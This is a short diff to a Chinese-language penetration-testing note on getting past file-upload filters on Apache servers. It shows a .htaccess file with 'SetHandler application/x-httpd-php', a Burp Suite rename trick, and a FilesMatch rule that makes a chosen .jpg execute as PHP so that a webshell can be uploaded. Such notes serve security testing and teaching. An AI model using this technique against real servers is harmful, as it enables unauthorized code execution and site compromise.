@@ -42,7 +42,13 @@
     创建任意文件
     文件内容为: SetHandler application/x-httpd-php
     文件另存为 .htaccess 即可，再上传任意文件即可当成 php 执行
-    有时候系统无法保存 .htaccess 文件，可以先保存 任意名.htaccess 上传后通过bp改为 .htaccess
+    有时候系统无法保存 .htaccess 文件，可以先保存 任意名.htaccess 上传后通过bp改为 .htaccess，然后再上传木马文件
+    
+    或者先预设一个将要上传的木马文件改写文件规则
+    <FilesMatch "自定义名称.jpg">
+        SetHandler application/x-httpd-php
+    </FilesMatch>	
+    然后再上传一个 自定义名称.jpg，这样这个文件被当做php执行
 ```
 
 
